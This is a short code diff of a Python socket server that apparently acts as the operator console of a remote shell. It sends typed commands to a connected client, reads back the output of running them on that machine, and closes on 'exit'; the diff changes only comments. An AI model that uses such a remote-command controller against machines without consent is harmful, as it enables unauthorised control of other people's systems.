@@ -17,13 +17,14 @@ while True:
     command = input("$ ")
 
     if command == "exit": # if the given command is "exit" then close the connection and break out of the loop
-        conn.send(command.encode("UTF-8")) # but first send it so the client closes connection too
+        conn.send(command.encode("UTF-8")) # but first send it to the client so it closes connection too
         s.close()
         break
 
     # with the connection object, send the input command (encoded from UTF-8 to bytes)
     conn.send(command.encode("UTF-8"))
 
+    # store in the response variable the output from the command run on the client side
     response = conn.recv(4096).decode("UTF-8")
 
     if response == "no output":# if the command doesnt have output dont try to print anything and iterate again
